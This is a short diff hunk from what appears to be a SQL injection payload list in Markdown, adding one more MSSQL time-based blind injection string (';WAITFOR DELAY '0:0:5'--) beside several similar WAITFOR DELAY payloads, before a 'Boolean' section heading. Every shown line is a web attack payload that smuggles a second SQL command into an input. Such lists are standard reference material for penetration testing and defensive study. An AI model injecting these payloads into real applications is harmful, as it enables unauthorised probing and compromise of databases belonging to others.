@@ -7,6 +7,7 @@ test;waitfor delay '0:0:5)'-- -  (MSSQL)
 1');WAITFOR DELAY '0:0:5)'-- -  (MSSQL)
 test';WAITFOR DELAY '0:0:5)'-- -  (MSSQL)
 1;WAITFOR DELAY '0:0:5)'-- -  (MSSQL)
+';WAITFOR DELAY '0:0:5'-- (MSSQL)
 ```
 
 ### Boolean
